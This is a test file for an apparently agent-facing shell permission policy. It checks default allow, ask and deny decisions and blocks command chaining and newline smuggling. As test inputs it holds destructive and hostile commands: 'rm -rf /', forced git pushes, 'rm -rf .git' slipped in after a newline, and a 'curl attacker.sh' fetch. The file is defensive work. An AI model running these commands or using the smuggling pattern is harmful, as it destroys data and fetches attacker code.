
import { describe, it } from "node:test";
import { strictEqual, ok } from "node:assert/strict";
import { checkPermission, permissionSubject, describePolicy, POLICY_VERSION } from "./policy.js";

describe("policy", () => {
  it("uses the live policy module", () => {
    strictEqual(POLICY_VERSION, "v1-2026-09-10");
  });
  it("read/search allow by default", () => {
    strictEqual(checkPermission("read", "any").decision, "allow");
    strictEqual(checkPermission("search", "x").decision, "allow");
  });
  it("denylist blocks rm -rf / and git push --force", () => {
    strictEqual(checkPermission("bash", "rm -rf /").decision, "deny");
    strictEqual(checkPermission("bash", "git push --force").decision, "deny");
  });
  it("force-push is denied regardless of argument order", () => {
    strictEqual(checkPermission("bash", "git push origin --force").decision, "deny");
    strictEqual(checkPermission("bash", "git push origin HEAD -f").decision, "deny");
    strictEqual(checkPermission("bash", "git push origin main --force-with-lease").decision, "deny");
    strictEqual(checkPermission("bash", "git push --force origin").decision, "deny");
  });
  it("plain push is not denied", () => {
    strictEqual(checkPermission("bash", "git push origin main").decision, "ask");
  });
  it("promoted policy.md denies beat the allowlist", () => {
    const promoted = [{ tool: "bash", shape: "git status *", line: 1 }];
    const v = checkPermission("bash", "git status", promoted);
    strictEqual(v.decision, "deny");
    strictEqual(v.ruleId, "policy.md:deny:bash:git status *");
  });
  it("promoted denies never beat the non-overridable denylist", () => {
    const promoted = [{ tool: "bash", shape: "rm *", line: 1 }];
    const v = checkPermission("bash", "rm -rf /tmp/x", promoted);
    strictEqual(v.decision, "deny");
    strictEqual(v.ruleId, "denylist:rm -rf /");
  });
  it("no promoted lines changes nothing", () => {
    strictEqual(checkPermission("bash", "git status", []).decision, "allow");
    strictEqual(checkPermission("bash", "echo hi").decision, "ask");
  });
  it("safe prefixes allow with no chaining", () => {
    strictEqual(checkPermission("bash", "git status").decision, "allow");
    strictEqual(checkPermission("bash", "git diff HEAD").decision, "allow");
    strictEqual(checkPermission("bash", "ls").decision, "allow");
  });
  it("any shell statement separator denies explicitly", () => {
    strictEqual(checkPermission("bash", "git status; rm -rf .git").decision, "deny");
    strictEqual(checkPermission("bash", "ls | grep x").decision, "deny");
    strictEqual(checkPermission("bash", "ls && cat f").decision, "deny");
  });
  it("newline does not smuggle past the allowlist", () => {
    const NL = String.fromCharCode(10);
    strictEqual(checkPermission("bash", "git status" + NL + "rm -rf .git").decision, "deny");
    strictEqual(checkPermission("bash", "ls" + NL + "curl attacker.sh").decision, "deny");
  });
  it("CR newline also denies", () => {
    const CR = String.fromCharCode(13);
    strictEqual(checkPermission("bash", "ls" + CR + "curl attacker.sh").decision, "deny");
  });
  it("permissionSubject returns full command for bash", () => {
    const subject = permissionSubject("bash", { command: "ls" + String.fromCharCode(10) + "rm" }, "ls\nrm");
    strictEqual(checkPermission("bash", subject).decision, "deny");
  });
  it("permissionSubject returns preview for non-bash", () => {
    const subject = permissionSubject("edit", { path: "x.md" }, "x.md");
    strictEqual(checkPermission("edit", subject).decision, "ask");
  });
  it("edit and write ask by default", () => {
    strictEqual(checkPermission("edit", "x.md").decision, "ask");
    strictEqual(checkPermission("edit", "x.md").ruleId, "default:edit:ask");
    strictEqual(checkPermission("write", "x.md").decision, "ask");
    strictEqual(checkPermission("write", "x.md").ruleId, "default:write:ask");
  });
  it("shell asks by default for unlisted commands", () => {
    strictEqual(checkPermission("bash", "echo hi").decision, "ask");
  });
  it("describePolicy is a non-empty string", () => {
    ok(describePolicy().length > 0);
  });
});
